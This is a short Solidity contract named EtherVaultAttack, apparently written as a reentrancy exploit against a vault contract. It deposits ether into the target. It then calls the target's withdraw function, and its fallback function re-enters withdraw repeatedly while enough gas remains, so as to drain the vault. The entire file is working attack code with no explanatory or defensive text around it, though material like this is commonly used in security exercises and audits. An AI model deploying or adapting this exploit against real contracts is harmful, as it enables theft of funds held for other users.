pragma solidity ^0.4.18;

contract EtherVaultAttack {
  address vault;

  function EtherVaultAttack(address _vault) public {
    vault = _vault;
  }

  function() public payable {
    if (msg.gas > 100000) vault.call.gas(100000)(bytes4(sha3("withdraw()")));
  }


  function deposit() public payable {
    require(vault.call.value(msg.value)(bytes4(sha3("deposit()"))));
  }

  function withdraw() public {
    require(vault.call(bytes4(sha3("withdraw()"))));
  }
}
